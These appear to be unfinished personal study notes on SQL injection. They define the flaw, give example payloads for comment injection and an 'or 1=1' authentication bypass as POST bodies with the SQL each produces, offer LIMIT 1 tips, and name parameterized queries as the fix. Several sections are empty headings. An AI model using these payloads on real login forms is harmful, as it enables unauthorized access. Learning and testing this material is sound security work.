# SQL injections notes

## Definition
Common web app vulnerability caused by unsanitized user input being inserted into queries and consequently passed to a database for execution. 


## Classic SQL injections

### Identifying a simple SQL injection
To be able to test a SQL injection we can use `'` that will be interpreted as a delimiter and will normally generate an error. We can add `--` to denote what follows as a comment in SQL: 
```
(POST request body)
username="admin'--"&password=passwd
```
The generated SQL will ressemble the following:
```sql
SELECT Id FROM users WHERE Username='admin'--' AND PASSWORD='passwd'
                                           #-> the rest of the query starting here is ignored.
```

### Simple authentication bypass
Same as before but by taking into account all comments possibilities and cases when the username does not exist : 
```
(POST request body)
username="admin' or 1=1;#--"&password=passwd
```
The generated SQL will ressemble the following:
```sql
SELECT Id FROM users WHERE Username='admin' or 1=1;#--' AND PASSWORD='passwd'
                                           #-> the rest of the query starting here is ignored.
```

### Enumerating the database


### tips and tricks
- We can add `LIMIT 1;` to limit the returned records to 1.
- `LIMIT 1` can also bypass condition where the is a check of the number of returned records.
- Blackbox testing always needs experimentation. 

## Blind SQL injections

## Injections in NoSQL


## SQLmap tips & tricks

## Remediation
Using ORMs or parameterized queries. 